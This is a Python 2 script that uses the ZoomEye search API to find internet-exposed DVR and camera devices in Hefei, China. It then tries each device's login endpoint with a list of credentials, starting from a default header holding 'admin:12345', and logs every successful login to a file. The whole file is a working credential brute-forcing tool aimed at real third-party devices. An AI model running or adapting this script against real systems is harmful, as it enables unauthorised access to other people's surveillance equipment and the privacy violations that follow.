import json
import urllib
import urllib2
import urlparse
import time
from xml.etree import ElementTree
import httplib
import ConfigParser
files=file("log.txt","a+")
header={"If-Modified-Since":"0","Accept":"*/*","Authorization":"Basic YWRtaW46MTIzNDU=","X-Requested-With":"XMLHttpRequest",
"Accept-Language":"zh-Hans-CN,zh-Hans;q=0.8,en-US;q=0.5,en;q=0.3","Accept-Encoding":"gzip, deflate","User-Agent":"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729)",
"Host":"","DNT":"1","Connection":"close"}
loginpath="/PSIA/Custom/SelfExt/userCheck"
def writeintofile(str,dic):
    files.writelines(str+"\t"+dic+"\n")
def loginreq(url,dic):
    repeat_time = 0
    urlp=urlparse.urlparse(url)
    header["Host"]=urlp[1]
    header["Authorization"]="Basic"+" "+dic;
    print "Try Base64 Password"+header["Authorization"]
    req=urllib2.Request(url,None,header)
    while True:
        try:
            res = urllib2.urlopen(req,None,1)
            return res
        except:
            print "Open Url Failed !!! Repeat"
            time.sleep(1)
            repeat_time = repeat_time+1
            if repeat_time == 5:
                return None
def login(url,dics):
    urlp=urlparse.urlparse(url)
    urlreq=urlp[0]+"://"+urlp[1]+loginpath
    print urlreq
    for dic in dics:
        res=loginreq(urlreq,dic)
        if(res==None):
            continue
        try:
            xml=ElementTree.fromstring(res.read())
            print xml.findtext("statusString")
            if(xml.findtext("statusString")=="OK"):
                writeintofile(urlreq,dic)
            return
        except Exception:
            print "Cannot Parse!"
            return None
    return
    #if(xml.findtext("statusString")=="OK"):
        #print "find"
def zoomeyelogin():
    url="https://api.zoomeye.org/user/login"
    temp="""{"username":"此处填ZoomEye账号","password":"此处填ZoomEye密码"}"""
    header={}
    req=urllib2.Request(url,temp,header)
    res=urllib2.urlopen(req)
    dict=json.loads(res.read())
    return dict['access_token']
def finddevice(token,page,dics):
    url="https://api.zoomeye.org/host/search?"
    header={"Authorization":"JWT "+token}
    temp={"query":"DVRDVS-Webs country:China city:Hefei","page":page}     
    param=urllib.urlencode(temp)
    url=url+param
    print url
    req=urllib2.Request(url,None,header)
    res=urllib2.urlopen(req)
    end=res.read()
    jsonend=json.loads(end)
    matches=jsonend["matches"]
    for ls in matches:
        print ls["ip"]+":"+str(ls["portinfo"]["port"])
        print ls["geoinfo"]["city"]["names"]["en"]
        urlreq="http://"+ls["ip"]+":"+str(ls["portinfo"]["port"])+"/"
        login(urlreq,dics)
def loadpassword():
    file=open("config","r")
    dics=set("");
    for dic in file.readlines():
        dics.add(dic)
    return dics
dics=loadpassword();
token=zoomeyelogin()
print token
finddevice(token,1,dics)
#HEFEI 5